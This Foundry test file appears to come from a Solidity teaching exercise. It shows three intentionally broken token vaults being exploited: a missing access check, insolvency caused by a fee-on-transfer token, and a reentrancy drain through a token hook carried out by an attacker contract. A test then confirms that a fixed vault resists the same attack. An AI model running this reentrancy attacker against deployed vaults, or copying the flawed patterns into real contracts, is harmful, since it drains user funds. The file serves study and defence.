// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {BootToken} from "../../src/b04/BootToken.sol";
import {MiniVault} from "../../src/b04/MiniVault.sol";
import {BrokenVaultA} from "../../src/b04/broken/BrokenVaultA.sol";
import {BrokenVaultB} from "../../src/b04/broken/BrokenVaultB.sol";
import {BrokenVaultC} from "../../src/b04/broken/BrokenVaultC.sol";
import {FeeToken} from "../../src/b04/mocks/FeeToken.sol";
import {HookToken} from "../../src/b04/mocks/HookToken.sol";

/// @notice 破坏 C 的攻击合约。只用于本地测试。
contract HookAttacker {
    BrokenVaultC vault;
    IERC20 token;
    bool attacking;

    constructor(BrokenVaultC _vault, IERC20 _token) {
        vault = _vault;
        token = _token;
    }

    function attack(uint256 amount) external {
        token.approve(address(vault), amount);
        vault.deposit(amount);
        attacking = true;
        vault.withdrawAll();
    }

    function onTokenReceived(uint256 amount) external {
        if (attacking && msg.sender == address(token) && token.balanceOf(address(vault)) >= amount) {
            vault.withdrawAll();
        }
    }
}

/// @notice 同样的攻击合约指向修好的金库。
contract HookAttackerOnFixed {
    MiniVault vault;
    IERC20 token;
    bool public reentryFailed;
    bool attacking;

    constructor(MiniVault _vault, IERC20 _token) {
        vault = _vault;
        token = _token;
    }

    function attack(uint256 amount) external {
        token.approve(address(vault), amount);
        vault.deposit(amount);
        attacking = true;
        vault.withdraw(amount);
        attacking = false;
    }

    function onTokenReceived(uint256 amount) external {
        if (!attacking || msg.sender != address(token)) return;
        try vault.withdraw(amount) {} catch {
            reentryFailed = true;
        }
    }
}

contract BreakTest is Test {
    address alice = makeAddr("alice");
    address mallory = makeAddr("mallory");

    function test_BreakA_AnyoneWithdrawsForOthers() public {
        BootToken token = new BootToken(100 ether);
        BrokenVaultA vault = new BrokenVaultA(token);
        token.transfer(alice, 100 ether);

        vm.startPrank(alice);
        token.approve(address(vault), 100 ether);
        vault.deposit(100 ether);
        vm.stopPrank();

        vm.prank(mallory);
        vault.withdraw(alice, 100 ether);

        assertEq(token.balanceOf(mallory), 100 ether);
        assertEq(vault.balanceOf(alice), 0);
    }

    function test_BreakB_FeeTokenMakesVaultInsolvent() public {
        FeeToken token = new FeeToken(1_000 ether);
        BrokenVaultB vault = new BrokenVaultB(token);
        token.transfer(alice, 200 ether); // alice 收到 198
        token.approve(address(vault), 100 ether);
        vault.deposit(100 ether);

        vm.startPrank(alice);
        token.approve(address(vault), 100 ether);
        vault.deposit(100 ether);
        vm.stopPrank();

        // 账面 200，实际到账 198。
        assertEq(vault.balanceOf(address(this)) + vault.balanceOf(alice), 200 ether);
        assertEq(token.balanceOf(address(vault)), 198 ether);

        // 第一个人全额取走后，第二个人取不出全部余额。
        vault.withdraw(100 ether);
        vm.prank(alice);
        vm.expectRevert();
        vault.withdraw(100 ether);
    }

    function test_BreakC_HookTokenDrainsVault() public {
        HookToken token = new HookToken(110 ether);
        BrokenVaultC vault = new BrokenVaultC(token);
        token.transfer(alice, 100 ether);
        vm.startPrank(alice);
        token.approve(address(vault), 100 ether);
        vault.deposit(100 ether);
        vm.stopPrank();

        HookAttacker attacker = new HookAttacker(vault, token);
        token.transfer(address(attacker), 10 ether);
        attacker.attack(10 ether);

        assertEq(token.balanceOf(address(vault)), 0);
        assertEq(token.balanceOf(address(attacker)), 110 ether);
        assertEq(vault.balanceOf(alice), 100 ether); // 账面还在，钱没了
    }

    function test_FixedVaultStopsHookReentry() public {
        HookToken token = new HookToken(110 ether);
        MiniVault vault = new MiniVault(token);
        token.transfer(alice, 100 ether);
        vm.startPrank(alice);
        token.approve(address(vault), 100 ether);
        vault.deposit(100 ether);
        vm.stopPrank();

        HookAttackerOnFixed attacker = new HookAttackerOnFixed(vault, token);
        token.transfer(address(attacker), 10 ether);
        attacker.attack(10 ether);

        assertTrue(attacker.reentryFailed());
        assertEq(token.balanceOf(address(attacker)), 10 ether);
        assertEq(token.balanceOf(address(vault)), 100 ether);
    }
}
